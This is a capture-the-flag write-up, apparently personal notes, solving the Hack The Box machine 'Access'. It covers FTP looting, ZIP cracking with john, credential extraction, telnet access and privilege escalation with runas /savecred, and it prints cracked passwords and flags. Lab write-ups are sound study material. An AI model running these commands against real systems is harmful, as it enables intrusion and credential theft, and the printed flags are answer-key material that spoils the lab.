# HTB: ACCESS 

## Challenge Details

- **Category:** [[CyberSecurity]], [[Web]], [[FTP]], [[Cracking]], [[Microsoft Access]], [[Telnet]], [[Privilege Escalation]]
    
- **Difficulty:** Easy/Medium
    
- **Target:** 10.129.253.28 (Windows System)
    
- **Status:** #solved
    
- **Date Completed:** [[2025-11-28]]
    

---

## 🔎 Phase 1: Reconnaissance & Initial Foothold

The initial objective was to identify open ports and services, leading directly to the exploit vector.

### 1. Nmap Scanning (Reconnaissance)

Your comprehensive Nmap commands identified three open services on the target **10.129.253.28**.

|**Command**|**Key Finding**|
|---|---|
|`nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt`|Ports **21 (ftp)**, **23 (telnet)**, **80 (http)** are open.|
|`nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt`|**FTP Anonymous Login Allowed**, **Telnet** NetBIOS Name: **ACCESS**, **HTTP** is **Microsoft IIS/7.5**.|

### 2. Gaining Access via Anonymous FTP

The primary entry vector was the anonymous FTP login on port 21, used to exfiltrate critical files.

|**Command**|**Purpose**|**Result**|
|---|---|---|
|`netexec ftp $target -u '' -p ''`|Automated check for Anonymous login.|**Success:** `[+] : - Anonymous Login!`|
|`wget -m --no-passive ftp://anonymous:anonymous@$target`|Recursively download all files.|Downloaded **`backup.mdb`** (MS Access Database) and **`Access Control.zip`** (password-protected archive).|

---

## 🔐 Phase 2: Credential Cracking & User Flag

The goal was to crack the ZIP password, analyze the exfiltrated data, and gain a user shell.

### 1. Cracking the ZIP Password

A custom wordlist was generated from the database to crack the hash of the protected ZIP file.

|**Command**|**Purpose**|**Cracked Password**|
|---|---|---|
|`strings -n 8 backup.mdb > pass`|Creates a custom wordlist (`pass`) from the MDB file.||
|`zip2john Access\ Control.zip > access`|Extracts the hash from the ZIP archive.||
|`john access -wordlist=pass`|Cracks the ZIP hash using the custom wordlist.|**`access4u@security`**|
|`unzip 'Access Control.zip'`|Unzips the archive.|Reveals **`Access Control.pst`** (Outlook/Email file).|

### 2. Information Gathering from Database & Email

The database and the email archive were analyzed to find valid login credentials.

|**Command**|**Purpose**|**Key Credential Found**|
|---|---|---|
|`for i in $(mdb-tables backup.mdb); do mdb-export backup.mdb $i > tables/$i; done`|Exports all tables from `backup.mdb`.|`auth_user` table confirmed `engineer:access4u@security`|
|`less Access\ Control.mbox`|Reads the content of the converted email file.|**New Telnet Credential:** `security:4Cc3ssC0ntr0ller`|

### 3. Acquiring the User Flag

|**Command**|**Purpose**|**User Flag**|
|---|---|---|
|`telnet $target`|Logs in using the `security:4Cc3ssC0ntr0ller` credential.|`fa98e4d148ba3d46729d58fb2891d293`|

---

## 👑 Phase 3: Privilege Escalation (Root Flag)

The final stage involved leveraging stored credentials to gain Administrator access and retrieve the root flag.

### 1. Discovering Stored Credentials

|**Command**|**Purpose**|**Key Finding**|
|---|---|---|
|`cmdkey /list`|Lists stored credentials for the current user session.|**Stored Credential:** `Target: Domain:interactive=ACCESS\Administrator`|

### 2. Root Flag Acquisition

The `runas` command was used with the available Administrator credentials to execute a command with elevated privileges.

|**Command**|**Purpose**|**Root Flag**|
|---|---|---|
|`runas /user:administrator /savecred "cmd /c type C:\Users\administrator\desktop\root.txt > C:\Users\security\desktop\flag.txt"`|Copies the root flag to the `security` user's accessible directory.|`537496777bfb29777adc2ca4f0435552`|
|`type desktop\flag.txt`|Views the contents of the newly created flag file.||
